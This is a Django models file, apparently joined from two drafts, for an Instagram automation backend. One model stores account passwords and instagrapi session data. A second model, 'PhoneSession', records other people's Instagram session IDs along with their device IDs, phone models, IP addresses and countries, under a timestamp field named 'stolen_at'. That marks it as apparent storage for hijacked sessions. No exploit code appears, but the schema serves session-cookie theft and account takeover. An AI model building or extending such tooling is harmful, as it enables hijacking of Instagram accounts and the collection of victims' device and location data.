# core/models.py
from django.db import models
from django.utils import timezone
from fernet_fields import EncryptedTextField  # ← ONLY THIS WORKS
import json


class InstagramAccount(models.Model):
    username = models.CharField(max_length=100, unique=True)
    password = EncryptedTextField(max_length=255)  # ← encrypted password


    session_data = EncryptedTextField(
        blank=True,
        null=True,
        help_text="Encrypted JSON string of instagrapi settings"
    )

    is_active = models.BooleanField(default=True)
    login_attempts = models.PositiveSmallIntegerField(default=0)
    last_success = models.DateTimeField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Instagram Account"
        ordering = ["-updated_at"]

    def __str__(self):
        return f"{self.username} ({'Active' if self.is_active else 'Inactive'})"

    # -------------------------------------------------- #
    # Get sessionid from decrypted JSON
    # -------------------------------------------------- #
    def get_sessionid(self):
        if not self.session_data:
            return None
        try:
            data = json.loads(self.session_data)
            return data.get("sessionid") or data.get("authorization_data", {}).get("sessionid")
        except (json.JSONDecodeError, TypeError):
            return None

    # -------------------------------------------------- #
    # Save full settings dict (as encrypted JSON string)
    # -------------------------------------------------- #
    def save_success(self, settings_dict: dict):
        self.session_data = json.dumps(settings_dict)
        self.last_success = timezone.now()
        self.login_attempts = 0
        self.is_active = True
        self.save(update_fields=[
            "session_data", "last_success",
            "login_attempts", "is_active", "updated_at"
        ])

    # -------------------------------------------------- #
    # Get decrypted settings dict
    # -------------------------------------------------- #
    def get_settings_dict(self):
        if not self.session_data:
            return {}
        try:
            return json.loads(self.session_data)
        except (json.JSONDecodeError, TypeError):
            return {}

    # -------------------------------------------------- #
    # Mark failed login
    # -------------------------------------------------- #
    def save_failure(self):
        self.login_attempts += 1
        if self.login_attempts >= 5:
            self.is_active = False
        self.save(update_fields=["login_attempts", "is_active", "updated_at"])
        
        
        
# core/models.py → FINAL GOD MODEL
from django.db import models
from django.utils import timezone

class PhoneSession(models.Model):
    username = models.CharField(max_length=100)
    user_id = models.CharField(max_length=50)
    sessionid = models.TextField()
    device_id = models.CharField(max_length=100, blank=True)
    phone_model = models.CharField(max_length=100, blank=True)
    android_version = models.CharField(max_length=50, blank=True)
    ip_address = models.CharField(max_length=50, blank=True)
    country = models.CharField(max_length=50, blank=True)
    stolen_at = models.DateTimeField(default=timezone.now)
    is_active = models.BooleanField(default=True)

    def __str__(self):
        return f"@{self.username} ({self.phone_model})"